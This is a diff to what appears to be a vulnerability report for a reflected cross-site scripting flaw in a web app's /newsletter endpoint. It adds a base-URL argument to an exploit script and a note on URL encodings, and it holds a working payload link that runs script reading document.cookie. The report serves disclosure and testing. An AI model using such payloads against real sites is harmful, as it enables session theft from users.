@@ -23,7 +23,7 @@ output context but not the other.
 
 ## Steps to reproduce
 
-Run `./exploit.sh`:
+Run `./exploit.sh [base_url]` (defaults to `http://localhost:4942`):
 
 1. `POST /newsletter` with `email=<b>xsstest</b>@test.com` → 302 redirect with
    the raw value in `location: /newsletter?email=%3Cb%3Exsstest%3C/b%3E@test.com&msg=subscribed`.
@@ -32,6 +32,9 @@ Run `./exploit.sh`:
 
 Exploit link: `/newsletter?email=<img src=x onerror=alert(document.cookie)>&msg=subscribed`
 executes in any victim's browser.
+
+Note: the URLs shown here and the fully percent-encoded URLs printed by the
+script are two equivalent encodings of the same payload — both work.
 
 ## Impact
 
